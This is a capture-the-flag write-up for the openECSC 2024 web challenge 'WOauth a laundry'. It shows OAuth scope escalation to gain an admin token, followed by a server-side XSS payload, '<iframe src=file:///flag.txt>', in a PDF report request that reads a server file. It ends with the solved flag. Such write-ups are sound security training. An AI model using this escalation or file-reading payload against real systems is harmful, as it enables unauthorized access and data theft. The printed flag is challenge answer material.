# WOauth a laundry!
> ### Category: web
>
> Welcome to our innovative business, the only ONE Laundry capable of completely sanitize your clothing by removing 100% of bacteria and viruses.
>
> Flag is in /flag.txt.
>
> Site: [http://woauthalaundry.challs.open.ecsc2024.it](http://woauthalaundry.challs.open.ecsc2024.it)
## Initial recon
Initially, the site appears to be empty. Some content appears after the `Login` button is pressed:

![media/website_0.png](media/website_0.png)

## API token
There are no cookies saved on the client side, however there are some interesting values in the session storage:

![media/website_1.png](media/website_1.png)

There appears to be some kind of API token and there's also a field `admin` set to 0. If we change it to 1 and reload the website, a new `Admin` tab will appear. It contains a single button `Generate report` which will attempt to perform a web request resulting in `401 Unauthorized` when pressed:

![media/website_2.png](media/website_2.png)

Let's investigate how the access token is generated. Log out, set a breakpoint on XHR requests and log back in:

The first performed requests seems to be fetching some sort of credentials:

![media/xhr_0.png](media/xhr_0.png)

This can be confirmed by performing it in curl:
```
$ curl http://woauthalaundry.challs.open.ecsc2024.it/api/v1/creds
{"client_id":"tAWvuF3X7dsp","client_secret":"bc4022e0b07b4e4f9239717a4d314043"}
```
However we don't see anything like the access token we saw in the session storage.

The second request seems like it actually returns the access token:

![media/xhr_1.png](media/xhr_1.png)

The `scope` path argument seems interesting - it is set to `laundry` and `amenities`. Earlier in the session storage we saw values corresponding to keys `laundries`, `amenities` and `admin`, therefore we might want to try adding `admin` to the `scope` (and we can also change the `cliend_id` to the one we got from curl):
```
$ curl 'http://woauthalaundry.challs.open.ecsc2024.it/openid/authentication?response_type=token%20id_token&client_id=tAWvuF3X7dsp&scope=openid%20laundry%20amenities%20admin&redirect_uri=http://localhost:5173/&grant_type=implicit&nonce=nonce'
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://localhost:5173/#access_token=d83088659aa041b1a6d68d1f652b1fae&amp;token_type=Bearer&amp;expires_in=3600&amp;id_token=eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiAiaHR0cHM6Ly93b2F1dGhhbGF1bmRyeS5jaGFsbHMub3Blbi5lY3NjMjAyNC5pdC9vcGVuaWQiLCAic3ViIjogImYwZDVlOGU0YTE5ZjRkZTlmMTIzNWYyMjViMTYwM2NiMDVjMjEwMGM0OWYyZTQxNzI0YzI4YWE3MDViZmFjNmYiLCAiYXVkIjogWyJ0QVd2dUYzWDdkc3AiXSwgImlhdCI6IDE3MTQ0Nzc4OTIsICJleHAiOiAxNzE0NDgxNDkyLCAiYXRfaGFzaCI6ICJDenNnN3V5cTg2bklwQzlQa2c2aERnIiwgIm5vbmNlIjogIm5vbmNlIn0.bBUny3X6Sf9x6tt-bWIH5RTvzDJPY_KOj7BtUpCz4gGBSKCWxFa0nhlLmfb2S6i3zZiOlioMpje7Yw9FyjuCsWvQQu4H-0992eavZ-OPMlgrX_FSAW7ED9zdf4bkT_HSEG1tbpsIRqIlysZGJoRXTBMoBJQ7cjZQOfkKYaCfWYYyHyb7Ptyr3GCnvUgYAVMLtfdqy_-L-zzT1XrochCxpy_UG0aQeCFUc92ZUWDcXOsUgcwpxnFQfdgaKJlPg29vaH_q8y3hp6CpfdUBNPvAVu0_MOWM_D0ZmtZA6JGHCGqxbHI1mVSBVgveGhRldiEZe3LTHC3UJKQIC2Crw0y9uDS1YhQvUSxGC8juHweuoQcL3E3i5DFixRjbuzansffdy_JWITwh27J6GlNHqfQ3VLcX99NtUzIsHkz6iWWvFu-lVwrBUE66Kk7XhQJnga8Ud-LkahkNBelnl1YqGU5a-h_RyWSoaAfxplwxGjXLEryfPEwJAYaFAK16gONWxJzBK8gYTPng-6CspFBDS-KQto314nbHVqGYLUwvHM_Hqv7k4w3lFSsDBS8SS325lhakZAGzOR77qfqPOldfJ58YXtPm2z27FLI28_9Tgiqyss2tmqJGJVP8asdI46-0IY7ftrEhqYCKINV1QQ1iaJC3Au049j21y8K7aTpCDpnxnOk">http://localhost:5173/#access_token=d83088659aa041b1a6d68d1f652b1fae&amp;token_type=Bearer&amp;expires_in=3600&amp;id_token=eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiAiaHR0cHM6Ly93b2F1dGhhbGF1bmRyeS5jaGFsbHMub3Blbi5lY3NjMjAyNC5pdC9vcGVuaWQiLCAic3ViIjogImYwZDVlOGU0YTE5ZjRkZTlmMTIzNWYyMjViMTYwM2NiMDVjMjEwMGM0OWYyZTQxNzI0YzI4YWE3MDViZmFjNmYiLCAiYXVkIjogWyJ0QVd2dUYzWDdkc3AiXSwgImlhdCI6IDE3MTQ0Nzc4OTIsICJleHAiOiAxNzE0NDgxNDkyLCAiYXRfaGFzaCI6ICJDenNnN3V5cTg2bklwQzlQa2c2aERnIiwgIm5vbmNlIjogIm5vbmNlIn0.bBUny3X6Sf9x6tt-bWIH5RTvzDJPY_KOj7BtUpCz4gGBSKCWxFa0nhlLmfb2S6i3zZiOlioMpje7Yw9FyjuCsWvQQu4H-0992eavZ-OPMlgrX_FSAW7ED9zdf4bkT_HSEG1tbpsIRqIlysZGJoRXTBMoBJQ7cjZQOfkKYaCfWYYyHyb7Ptyr3GCnvUgYAVMLtfdqy_-L-zzT1XrochCxpy_UG0aQeCFUc92ZUWDcXOsUgcwpxnFQfdgaKJlPg29vaH_q8y3hp6CpfdUBNPvAVu0_MOWM_D0ZmtZA6JGHCGqxbHI1mVSBVgveGhRldiEZe3LTHC3UJKQIC2Crw0y9uDS1YhQvUSxGC8juHweuoQcL3E3i5DFixRjbuzansffdy_JWITwh27J6GlNHqfQ3VLcX99NtUzIsHkz6iWWvFu-lVwrBUE66Kk7XhQJnga8Ud-LkahkNBelnl1YqGU5a-h_RyWSoaAfxplwxGjXLEryfPEwJAYaFAK16gONWxJzBK8gYTPng-6CspFBDS-KQto314nbHVqGYLUwvHM_Hqv7k4w3lFSsDBS8SS325lhakZAGzOR77qfqPOldfJ58YXtPm2z27FLI28_9Tgiqyss2tmqJGJVP8asdI46-0IY7ftrEhqYCKINV1QQ1iaJC3Au049j21y8K7aTpCDpnxnOk</a>. If not, click the link.
```

## Admin panel
It would appear that we actually got a new access token - let's put it in the session storage and try to generate a report once more:

![media/website_3.png](media/website_3.png)

This time we receive a PDF file. Let's try setting a breakpoint on XHR requests again:

![media/xhr_2.png](media/xhr_2.png)

A POST request with an empty body and our token in the `Authorization` header is sent. However, we can notice something interesting in the JavaScript console now:

![media/console_0.png](media/console_0.png)

It seems that this endpoint might expect a `requiredBy` key in the body. Let's try sending a request like this from curl:
```
$ curl -v -X POST http://woauthalaundry.challs.open.ecsc2024.it/api/v1/generate-report -H 'Content-Type: application/json' -H 'Authorization: Bearer d83088659aa041b1a6d68d1f652b1fae' -d '{"requiredBy": "John Doe"}' --output test.pdf
```
This results in a PDF with changed header being generated:

![media/website_4.png](media/website_4.png)

As we can see, the PDF is generated on the server and therefore the application might be vulnerable to server side XSS. We can use an example payload from [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) to try reading the file with the flag:
```
$ curl -v -X POST http://woauthalaundry.challs.open.ecsc2024.it/api/v1/generate-report -H 'Content-Type: application/json' -H 'Authorization: Bearer d83088659aa041b1a6d68d1f652b1fae' -d '{"requiredBy": "<iframe src=file:///flag.txt></iframe>"}' --output test.pdf
```

![media/website_5.png](media/website_5.png)

## Flag
`openECSC{On3_l4uNdrY_70_ruL3_7h3m_4l1!_d208a530}`